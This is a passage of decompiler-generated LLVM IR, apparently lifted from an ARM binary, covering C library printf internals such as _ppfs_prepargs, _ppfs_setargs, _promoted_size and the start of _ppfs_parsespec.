  br label %dec_label_pc_152fc

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152f0.dec_label_pc_152fc_crit_edge, %dec_label_pc_152b0
  %v0_152fc = phi i32 [ %v0_152fc.pre, %dec_label_pc_152f0.dec_label_pc_152fc_crit_edge ], [ %v0_152b0, %dec_label_pc_152b0 ]
  %v1_152fc = load i32, i32* @r4, align 4
  %v2_152fc = inttoptr i32 %v1_152fc to i32*
  store i32 %v0_152fc, i32* %v2_152fc, align 4
  %v1_15308.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_15300.loopexit:                      ; preds = %dec_label_pc_152cc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_15300.loopexit, %dec_label_pc_152fc
  %v1_15308 = phi i32 [ -1, %dec_label_pc_15300.loopexit ], [ %v1_15308.pre, %dec_label_pc_152fc ]
  store i32 %v3_1526c, i32* @r4, align 4
  store i32 %v6_1526c, i32* @r5, align 4
  ret i32 %v1_15308

; uselistorder directives
  uselistorder i32 %v3_152f0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_152b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_152a8, { 1, 0 }
  uselistorder i32 %v0_152a4.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_152ec, { 1, 0 }
  uselistorder label %dec_label_pc_152b8, { 1, 0 }
  uselistorder label %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1530c = load i32, i32* @r4, align 4
  store i32 %v3_1530c, i32* %stack_var_-12, align 4
  %v0_15310 = load i32, i32* @r0, align 4
  %v1_15310 = add i32 %v0_15310, 24
  %v2_15310 = inttoptr i32 %v1_15310 to i32*
  %v3_15310 = load i32, i32* %v2_15310, align 4
  store i32 %v3_15310, i32* %r5.global-to-local, align 4
  store i32 %v0_15310, i32* @r4, align 4
  %v2_15320 = add i32 %v0_15310, 76
  %v3_15320 = inttoptr i32 %v2_15320 to i32*
  store i32 %arg2, i32* %v3_15320, align 4
  %tmp5 = icmp slt i32 %v3_15310, 1
  br i1 %tmp5, label %dec_label_pc_15344, label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1532c = load i32, i32* @r0, align 4
  %v2_1532c = add i32 %v1_1532c, 8
  %v3_1532c = inttoptr i32 %v2_1532c to i32*
  store i32 0, i32* %v3_1532c, align 4
  %v0_15330 = load i32, i32* %r5.global-to-local, align 4
  %v1_15330 = load i32, i32* @r0, align 4
  %v2_15330 = add i32 %v1_15330, 28
  %v3_15330 = inttoptr i32 %v2_15330 to i32*
  store i32 %v0_15330, i32* %v3_15330, align 4
  %v0_15334 = load i32, i32* %r3.global-to-local, align 4
  %v1_15334 = load i32, i32* @r0, align 4
  %v2_15334 = add i32 %v1_15334, 24
  %v3_15334 = inttoptr i32 %v2_15334 to i32*
  store i32 %v0_15334, i32* %v3_15334, align 4
  %v0_15338 = load i32, i32* %r3.global-to-local, align 4
  %v1_15338 = load i32, i32* @r0, align 4
  %v2_15338 = add i32 %v1_15338, 4
  %v3_15338 = inttoptr i32 %v2_15338 to i32*
  store i32 %v0_15338, i32* %v3_15338, align 4
  %v0_1533c = call i32 @_ppfs_setargs()
  store i32 %v0_1533c, i32* @r0, align 4
  %v0_15340 = load i32, i32* %r5.global-to-local, align 4
  %v1_15340 = load i32, i32* @r4, align 4
  %v2_15340 = add i32 %v1_15340, 24
  %v3_15340 = inttoptr i32 %v2_15340 to i32*
  store i32 %v0_15340, i32* %v3_15340, align 4
  br label %dec_label_pc_15344

dec_label_pc_15344:                               ; preds = %entry, %dec_label_pc_15328
  %v2_15348 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15348, i32* @r4, align 4
  %v1_1534c = load i32, i32* @r0, align 4
  ret i32 %v1_1534c

; uselistorder directives
  uselistorder i32 %v0_15310, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_15344, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_15350 = load i32, i32* @r0, align 4
  %v1_15350 = add i32 %v0_15350, 24
  %v2_15350 = inttoptr i32 %v1_15350 to i32*
  %v3_15350 = load i32, i32* %v2_15350, align 4
  store i32 %v3_15350, i32* %r1.global-to-local, align 4
  %v2_15354 = icmp eq i32 %v3_15350, 0
  %v3_15358 = load i32, i32* @r4, align 4
  store i32 %v3_15358, i32* %stack_var_-8, align 4
  %v1_1535c = add i32 %v0_15350, 8
  %v2_1535c = inttoptr i32 %v1_1535c to i32*
  %v3_1535c = load i32, i32* %v2_1535c, align 4
  store i32 %v3_1535c, i32* %r3.global-to-local, align 4
  %v6_15364 = icmp eq i32 %v3_1535c, -2147483648
  br i1 %v2_15354, label %dec_label_pc_15364, label %dec_label_pc_1549c

dec_label_pc_15364:                               ; preds = %entry
  br i1 %v6_15364, label %dec_label_pc_1536c, label %dec_label_pc_15384

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15364
  %v1_1536c = add i32 %v0_15350, 76
  %v2_1536c = inttoptr i32 %v1_1536c to i32*
  %v3_1536c = load i32, i32* %v2_1536c, align 4
  store i32 %v3_1536c, i32* %r3.global-to-local, align 4
  %v1_15370 = inttoptr i32 %v3_1536c to i32*
  %v2_15370 = load i32, i32* %v1_15370, align 4
  store i32 %v2_15370, i32* %r2.global-to-local, align 4
  %v1_15374 = add i32 %v3_1536c, 4
  store i32 %v1_15374, i32* %r3.global-to-local, align 4
  store i32 %v1_15374, i32* %v2_1536c, align 4
  %v0_1537c = load i32, i32* %r2.global-to-local, align 4
  %v1_1537c = load i32, i32* @r0, align 4
  %v2_1537c = add i32 %v1_1537c, 8
  %v3_1537c = inttoptr i32 %v2_1537c to i32*
  store i32 %v0_1537c, i32* %v3_1537c, align 4
  %v0_15380 = load i32, i32* %r2.global-to-local, align 4
  %v1_15380 = load i32, i32* @r0, align 4
  %v2_15380 = add i32 %v1_15380, 80
  %v3_15380 = inttoptr i32 %v2_15380 to i32*
  store i32 %v0_15380, i32* %v3_15380, align 4
  %v0_15384.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15364, %dec_label_pc_1536c
  %v1_153a0 = phi i32 [ %v0_15350, %dec_label_pc_15364 ], [ %v0_15384.pre, %dec_label_pc_1536c ]
  %v1_15384 = add i32 %v1_153a0, 4
  %v2_15384 = inttoptr i32 %v1_15384 to i32*
  %v3_15384 = load i32, i32* %v2_15384, align 4
  store i32 %v3_15384, i32* %r3.global-to-local, align 4
  %v6_15388 = icmp eq i32 %v3_15384, -2147483648
  %v1_1538c = add i32 %v1_153a0, 80
  store i32 %v1_1538c, i32* %ip.global-to-local, align 4
  br i1 %v6_15388, label %dec_label_pc_15394, label %dec_label_pc_153ac

dec_label_pc_15394:                               ; preds = %dec_label_pc_15384
  %v1_15394 = add i32 %v1_153a0, 76
  %v2_15394 = inttoptr i32 %v1_15394 to i32*
  %v3_15394 = load i32, i32* %v2_15394, align 4
  store i32 %v3_15394, i32* %r3.global-to-local, align 4
  %v1_15398 = inttoptr i32 %v3_15394 to i32*
  %v2_15398 = load i32, i32* %v1_15398, align 4
  store i32 %v2_15398, i32* %r2.global-to-local, align 4
  %v1_1539c = add i32 %v3_15394, 4
  store i32 %v1_1539c, i32* %r3.global-to-local, align 4
  store i32 %v1_1539c, i32* %v2_15394, align 4
  %v0_153a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_153a4 = load i32, i32* @r0, align 4
  %v2_153a4 = add i32 %v1_153a4, 4
  %v3_153a4 = inttoptr i32 %v2_153a4 to i32*
  store i32 %v0_153a4, i32* %v3_153a4, align 4
  %v0_153a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_153a8 = load i32, i32* @r0, align 4
  %v2_153a8 = add i32 %v1_153a8, 80
  %v3_153a8 = inttoptr i32 %v2_153a8 to i32*
  store i32 %v0_153a8, i32* %v3_153a8, align 4
  %v0_1548c17.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %dec_label_pc_15384, %dec_label_pc_15394
  %v0_1548c17 = phi i32 [ %v1_153a0, %dec_label_pc_15384 ], [ %v0_1548c17.pre, %dec_label_pc_15394 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_153b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_153b0, i32* %lr.global-to-local, align 4
  %v1_1548c18 = add i32 %v0_1548c17, 28
  %v2_1548c19 = inttoptr i32 %v1_1548c18 to i32*
  %v3_1548c20 = load i32, i32* %v2_1548c19, align 4
  store i32 %v3_1548c20, i32* %r3.global-to-local, align 4
  %v5_1549422 = icmp slt i32 %v0_153b0, %v3_1548c20
  br i1 %v5_1549422, label %dec_label_pc_153b8, label %dec_label_pc_15498.loopexit

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153ac, %dec_label_pc_1548c.backedge
  %v0_1548c24 = phi i32 [ %v0_1548c, %dec_label_pc_1548c.backedge ], [ %v0_1548c17, %dec_label_pc_153ac ]
  %v0_153c423 = phi i32 [ %v0_153c4.be, %dec_label_pc_1548c.backedge ], [ %v0_153b0, %dec_label_pc_153ac ]
  %v4_153b8 = mul i32 %v0_153c423, 4
  %v5_153b8 = add i32 %v4_153b8, %v0_1548c24
  store i32 %v5_153b8, i32* %r3.global-to-local, align 4
  %v1_153bc = add i32 %v5_153b8, 40
  %v2_153bc = inttoptr i32 %v1_153bc to i32*
  %v3_153bc = load i32, i32* %v2_153bc, align 4
  store i32 %v3_153bc, i32* %r3.global-to-local, align 4
  %v7_153c0 = icmp eq i32 %v3_153bc, 8
  %v1_153c4 = add i32 %v0_153c423, 1
  store i32 %v1_153c4, i32* %lr.global-to-local, align 4
  br i1 %v7_153c0, label %dec_label_pc_1548c.backedge, label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153b8
  %v1_153cc = add i32 %v0_1548c24, 76
  %v2_153cc = inttoptr i32 %v1_153cc to i32*
  %v3_153cc = load i32, i32* %v2_153cc, align 4
  store i32 %v3_153cc, i32* %r1.global-to-local, align 4
  %v8_153d0 = icmp sgt i32 %v3_153bc, 8
  br i1 %v8_153d0, label %dec_label_pc_153f4, label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153cc
  %v7_153d4 = icmp eq i32 %v3_153bc, 2
  br i1 %v7_153d4, label %dec_label_pc_15444, label %dec_label_pc_153dc

dec_label_pc_153dc:                               ; preds = %dec_label_pc_153d4
  %v8_153dc = icmp sgt i32 %v3_153bc, 2
  br i1 %v8_153dc, label %dec_label_pc_153ec, label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153dc
  %v1_153e0 = icmp slt i32 %v3_153bc, 0
  br i1 %v1_153e0, label %dec_label_pc_15478, label %dec_label_pc_15444

dec_label_pc_153ec:                               ; preds = %dec_label_pc_153dc
  %v7_153ec = icmp eq i32 %v3_153bc, 7
  br i1 %v7_153ec, label %dec_label_pc_15458, label %dec_label_pc_15478

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153cc
  %v7_153f4 = icmp eq i32 %v3_153bc, 1024
  br i1 %v7_153f4, label %dec_label_pc_15444, label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153f4
  %v8_153fc = icmp sgt i32 %v3_153bc, 1024
  br i1 %v8_153fc, label %dec_label_pc_15414, label %dec_label_pc_15400

dec_label_pc_15400:                               ; preds = %dec_label_pc_153fc
  switch i32 %v3_153bc, label %dec_label_pc_15478 [
    i32 256, label %dec_label_pc_15444
    i32 512, label %dec_label_pc_15444
  ]

dec_label_pc_15414:                               ; preds = %dec_label_pc_153fc
  %v7_15414 = icmp eq i32 %v3_153bc, 2048
  br i1 %v7_15414, label %dec_label_pc_15428, label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_15414
  %v1_1541c = load i32, i32* %r4.global-to-local, align 4
  %v9_1541c = icmp eq i32 %v3_153bc, %v1_1541c
  br i1 %v9_1541c, label %dec_label_pc_15458, label %dec_label_pc_15478

dec_label_pc_15428:                               ; preds = %dec_label_pc_15414
  %v1_15428 = add i32 %v3_153cc, 7
  %v1_1542c = and i32 %v1_15428, -8
  store i32 %v1_1542c, i32* %r3.global-to-local, align 4
  %v1_15430 = inttoptr i32 %v1_1542c to i32*
  %v2_15430 = load i32, i32* %v1_15430, align 8
  store i32 %v2_15430, i32* %r1.global-to-local, align 4
  %v3_15430 = or i32 %v1_1542c, 4
  %v4_15430 = inttoptr i32 %v3_15430 to i32*
  %v5_15430 = load i32, i32* %v4_15430, align 4
  store i32 %v5_15430, i32* %r2.global-to-local, align 4
  %v1_15434 = add i32 %v1_1542c, 8
  store i32 %v1_15434, i32* %r3.global-to-local, align 4
  store i32 %v1_15434, i32* %v2_153cc, align 4
  %v0_1543c = load i32, i32* %ip.global-to-local, align 4
  %v1_1543c = inttoptr i32 %v0_1543c to i32*
  %v2_1543c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_1543c, i32* %v1_1543c, align 4
  %v3_1543c = add i32 %v0_1543c, 4
  %v4_1543c = inttoptr i32 %v3_1543c to i32*
  %v5_1543c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1543c, i32* %v4_1543c, align 4
  br label %dec_label_pc_15488

dec_label_pc_15444:                               ; preds = %dec_label_pc_15400, %dec_label_pc_15400, %dec_label_pc_153e0, %dec_label_pc_153f4, %dec_label_pc_153d4
  %v1_15444 = inttoptr i32 %v3_153cc to i32*
  %v2_15444 = load i32, i32* %v1_15444, align 4
  store i32 %v2_15444, i32* %r2.global-to-local, align 4
  %v1_15448 = add i32 %v3_153cc, 4
  store i32 %v1_15448, i32* %r3.global-to-local, align 4
  store i32 %v1_15448, i32* %v2_153cc, align 4
  %v0_15450 = load i32, i32* %r2.global-to-local, align 4
  %v1_15450 = load i32, i32* %ip.global-to-local, align 4
  %v2_15450 = inttoptr i32 %v1_15450 to i32*
  store i32 %v0_15450, i32* %v2_15450, align 4
  br label %dec_label_pc_15488

dec_label_pc_15458:                               ; preds = %dec_label_pc_153ec, %dec_label_pc_15420
  %v3_15458 = load i32, i32* %v2_153cc, align 4
  %v1_1545c = add i32 %v3_15458, 7
  %v1_15460 = and i32 %v1_1545c, -8
  store i32 %v1_15460, i32* %r3.global-to-local, align 4
  %v1_15464 = inttoptr i32 %v1_15460 to i32*
  %v2_15464 = load i32, i32* %v1_15464, align 8
  store i32 %v2_15464, i32* %r1.global-to-local, align 4
  %v3_15464 = or i32 %v1_15460, 4
  %v4_15464 = inttoptr i32 %v3_15464 to i32*
  %v5_15464 = load i32, i32* %v4_15464, align 4
  store i32 %v5_15464, i32* %r2.global-to-local, align 4
  %v1_15468 = add i32 %v1_15460, 8
  store i32 %v1_15468, i32* %r3.global-to-local, align 4
  store i32 %v1_15468, i32* %v2_153cc, align 4
  %v0_15470 = load i32, i32* %ip.global-to-local, align 4
  %v1_15470 = inttoptr i32 %v0_15470 to i32*
  %v2_15470 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15470, i32* %v1_15470, align 4
  %v3_15470 = add i32 %v0_15470, 4
  %v4_15470 = inttoptr i32 %v3_15470 to i32*
  %v5_15470 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_15470, i32* %v4_15470, align 4
  br label %dec_label_pc_15488

dec_label_pc_15478:                               ; preds = %dec_label_pc_15400, %dec_label_pc_153ec, %dec_label_pc_153e0, %dec_label_pc_15420
  %v1_15478 = add i32 %v3_153cc, 4
  store i32 %v1_15478, i32* %r3.global-to-local, align 4
  store i32 %v1_15478, i32* %v2_153cc, align 4
  %v0_15480 = load i32, i32* %r1.global-to-local, align 4
  %v1_15480 = inttoptr i32 %v0_15480 to i32*
  %v2_15480 = load i32, i32* %v1_15480, align 4
  store i32 %v2_15480, i32* %r3.global-to-local, align 4
  %v1_15484 = load i32, i32* %ip.global-to-local, align 4
  %v2_15484 = inttoptr i32 %v1_15484 to i32*
  store i32 %v2_15480, i32* %v2_15484, align 4
  br label %dec_label_pc_15488

dec_label_pc_15488:                               ; preds = %dec_label_pc_15458, %dec_label_pc_15444, %dec_label_pc_15428, %dec_label_pc_15478
  %v0_15488 = load i32, i32* %ip.global-to-local, align 4
  %v1_15488 = add i32 %v0_15488, 8
  store i32 %v1_15488, i32* %ip.global-to-local, align 4
  %v0_15490.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1548c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1548c.backedge

dec_label_pc_1548c.backedge:                      ; preds = %dec_label_pc_15488, %dec_label_pc_153b8
  %v0_1548c = phi i32 [ %v0_1548c.pre, %dec_label_pc_15488 ], [ %v0_1548c24, %dec_label_pc_153b8 ]
  %v0_153c4.be = phi i32 [ %v0_15490.pre.pre, %dec_label_pc_15488 ], [ %v1_153c4, %dec_label_pc_153b8 ]
  %v1_1548c = add i32 %v0_1548c, 28
  %v2_1548c = inttoptr i32 %v1_1548c to i32*
  %v3_1548c = load i32, i32* %v2_1548c, align 4
  store i32 %v3_1548c, i32* %r3.global-to-local, align 4
  %v5_15494 = icmp slt i32 %v0_153c4.be, %v3_1548c
  br i1 %v5_15494, label %dec_label_pc_153b8, label %dec_label_pc_1548c.dec_label_pc_15498.loopexit_crit_edge

dec_label_pc_1549c:                               ; preds = %entry
  br i1 %v6_15364, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1549c
  %v2_154a0 = add i32 %v0_15350, 36
  %v3_154a0 = inttoptr i32 %v2_154a0 to i8*
  %v4_154a0 = load i8, i8* %v3_154a0, align 1
  %v5_154a0 = zext i8 %v4_154a0 to i32
  %v5_154a4 = mul nuw nsw i32 %v5_154a0, 8
  %v6_154a4 = add i32 %v5_154a4, %v0_15350
  store i32 %v6_154a4, i32* %r3.global-to-local, align 4
  %v2_154a8 = add i32 %v6_154a4, 72
  %v3_154a8 = inttoptr i32 %v2_154a8 to i32*
  %v4_154a8 = load i32, i32* %v3_154a8, align 4
  store i32 %v4_154a8, i32* %r3.global-to-local, align 4
  store i32 %v4_154a8, i32* %v2_1535c, align 4
  %v0_154b0.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1549c, %bb
  %v2_154c4 = phi i32 [ %v0_154b0.pre, %bb ], [ %v0_15350, %dec_label_pc_1549c ]
  %v1_154b0 = add i32 %v2_154c4, 4
  %v2_154b0 = inttoptr i32 %v1_154b0 to i32*
  %v3_154b0 = load i32, i32* %v2_154b0, align 4
  store i32 %v3_154b0, i32* %r3.global-to-local, align 4
  %v6_154b4 = icmp eq i32 %v3_154b0, -2147483648
  br i1 %v6_154b4, label %bb16, label %dec_label_pc_15498

bb16:                                             ; preds = %.thread1
  %v2_154b8 = add i32 %v2_154c4, 37
  %v3_154b8 = inttoptr i32 %v2_154b8 to i8*
  %v4_154b8 = load i8, i8* %v3_154b8, align 1
  %v5_154b8 = zext i8 %v4_154b8 to i32
  %v5_154bc = mul nuw nsw i32 %v5_154b8, 8
  %v6_154bc = add i32 %v5_154bc, %v2_154c4
  store i32 %v6_154bc, i32* %r3.global-to-local, align 4
  %v2_154c0 = add i32 %v6_154bc, 72
  %v3_154c0 = inttoptr i32 %v2_154c0 to i32*
  %v4_154c0 = load i32, i32* %v3_154c0, align 4
  store i32 %v4_154c0, i32* %r3.global-to-local, align 4
  store i32 %v4_154c0, i32* %v2_154b0, align 4
  %v0_154c8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15498

dec_label_pc_1548c.dec_label_pc_15498.loopexit_crit_edge: ; preds = %dec_label_pc_1548c.backedge
  br label %dec_label_pc_15498.loopexit

dec_label_pc_15498.loopexit:                      ; preds = %dec_label_pc_1548c.dec_label_pc_15498.loopexit_crit_edge, %dec_label_pc_153ac
  %v0_1548c.lcssa = phi i32 [ %v0_1548c, %dec_label_pc_1548c.dec_label_pc_15498.loopexit_crit_edge ], [ %v0_1548c17, %dec_label_pc_153ac ]
  br label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15498.loopexit, %.thread1, %bb16
  %v1_154e8 = phi i32 [ %v0_1548c.lcssa, %dec_label_pc_15498.loopexit ], [ %v2_154c4, %.thread1 ], [ %v0_154c8.pre, %bb16 ]
  %v1_154c8 = add i32 %v1_154e8, 8
  %v2_154c8 = inttoptr i32 %v1_154c8 to i32*
  %v3_154c8 = load i32, i32* %v2_154c8, align 4
  store i32 %v3_154c8, i32* %r1.global-to-local, align 4
  %v1_154cc = icmp slt i32 %v3_154c8, 0
  br i1 %v1_154cc, label %dec_label_pc_154d4, label %dec_label_pc_154f4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_15498
  %v1_154d4 = add i32 %v1_154e8, 16
  %v2_154d4 = inttoptr i32 %v1_154d4 to i32*
  %v3_154d4 = load i32, i32* %v2_154d4, align 4
  %v1_154dc = sub i32 0, %v3_154c8
  store i32 %v1_154dc, i32* %r1.global-to-local, align 4
  %v1_154d8 = and i32 %v3_154d4, -10
  %v1_154e0 = or i32 %v1_154d8, 8
  store i32 %v1_154e0, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_154e8 = add i32 %v1_154e8, 20
  %v3_154e8 = inttoptr i32 %v2_154e8 to i32*
  store i32 32, i32* %v3_154e8, align 4
  %v0_154ec = load i32, i32* %r1.global-to-local, align 4
  %v1_154ec = load i32, i32* @r0, align 4
  %v2_154ec = add i32 %v1_154ec, 8
  %v3_154ec = inttoptr i32 %v2_154ec to i32*
  store i32 %v0_154ec, i32* %v3_154ec, align 4
  %v0_154f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_154f0 = load i32, i32* @r0, align 4
  %v2_154f0 = add i32 %v1_154f0, 16
  %v3_154f0 = inttoptr i32 %v2_154f0 to i32*
  store i32 %v0_154f0, i32* %v3_154f0, align 4
  %v1_154f8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_15498, %dec_label_pc_154d4
  %v1_154f8 = phi i32 [ %v1_154e8, %dec_label_pc_15498 ], [ %v1_154f8.pre, %dec_label_pc_154d4 ]
  %v2_154f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_154f4, i32* @r4, align 4
  ret i32 %v1_154f8

; uselistorder directives
  uselistorder i32 %v2_154c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_153c4.be, { 1, 0 }
  uselistorder i32 %v0_1548c, { 1, 2, 0 }
  uselistorder i32 %v3_153cc, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_153cc, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_153bc, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_153c423, { 1, 0 }
  uselistorder i32 %v0_1548c24, { 0, 2, 1 }
  uselistorder i32 %v0_1548c17, { 2, 0, 1 }
  uselistorder i32 %v0_15350, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_154f4, { 1, 0 }
  uselistorder label %dec_label_pc_15498, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15488, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15478, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15458, { 1, 0 }
  uselistorder label %dec_label_pc_15444, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_153b8, { 1, 0 }
  uselistorder label %dec_label_pc_153ac, { 1, 0 }
  uselistorder label %dec_label_pc_15384, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_1551c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15518

dec_label_pc_15518:                               ; preds = %dec_label_pc_15524, %entry
  %v0_15518 = phi i32 [ %v1_15518, %dec_label_pc_15524 ], [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38846), %entry ]
  %v1_15518 = add i32 %v0_15518, -2
  %v2_15518 = inttoptr i32 %v1_15518 to i16*
  %v3_15518 = load i16, i16* %v2_15518, align 2
  %v4_15518 = sext i16 %v3_15518 to i32
  store i32 %v1_15518, i32* @ip, align 4
  %v9_1551c = icmp eq i32 %v4_15518, %v1_1551c.pre
  br i1 %v9_1551c, label %dec_label_pc_15518.dec_label_pc_1552c_crit_edge, label %dec_label_pc_15524

dec_label_pc_15518.dec_label_pc_1552c_crit_edge:  ; preds = %dec_label_pc_15518
  br label %dec_label_pc_1552c

dec_label_pc_15524:                               ; preds = %dec_label_pc_15518
  %tmp = icmp ugt i32 %v1_15518, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38870)
  br i1 %tmp, label %dec_label_pc_15518, label %dec_label_pc_1552c.loopexit

dec_label_pc_1552c.loopexit:                      ; preds = %dec_label_pc_15524
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_1552c.loopexit, %dec_label_pc_15518.dec_label_pc_1552c_crit_edge
  %v2_1553c.pre-phi = sub i32 %v1_15518, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38870)
  store i32 %v2_1553c.pre-phi, i32* @r2, align 4
  %v4_15540 = sdiv i32 %v2_1553c.pre-phi, 2
  %v5_15540 = add i32 %v4_15540, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38846)
  %v6_15540 = inttoptr i32 %v5_15540 to i8*
  %v7_15540 = load i8, i8* %v6_15540, align 1
  %v9_15540 = zext i8 %v7_15540 to i32
  ret i32 %v9_15540

; uselistorder directives
  uselistorder i32 %v2_1553c.pre-phi, { 1, 0 }
  uselistorder i32 %v1_15518, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38870), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15554 = load i32, i32* @r4, align 4
  store i32 %v3_15554, i32* %stack_var_-36, align 4
  %v6_15554 = load i32, i32* @r5, align 4
  %v27_15554 = load i32, i32* @lr, align 4
  %v0_15558 = load i32, i32* %r0.global-to-local, align 4
  %v1_15558 = add i32 %v0_15558, 16
  %v2_15558 = inttoptr i32 %v1_15558 to i32*
  %v3_15558 = load i32, i32* %v2_15558, align 4
  %v1_15560 = and i32 %v3_15558, 128
  store i32 %v1_15560, i32* @r4, align 4
  %v2_15560 = icmp eq i32 %v1_15560, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_15558, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @lr, align 4
  %v1_15588 = add i32 %v0_15558, 24
  %v2_15588 = inttoptr i32 %v1_15588 to i32*
  %v3_15588 = load i32, i32* %v2_15588, align 4
  store i32 %v3_15588, i32* %fp.global-to-local, align 4
  br i1 %v2_15560, label %.dec_label_pc_155dc_crit_edge, label %dec_label_pc_15594

.dec_label_pc_155dc_crit_edge:                    ; preds = %entry
  %v2_1558c = inttoptr i32 %v0_15558 to i32*
  %v3_1558c = load i32, i32* %v2_1558c, align 4
  store i32 %v3_1558c, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_155dc

dec_label_pc_15594:                               ; preds = %entry
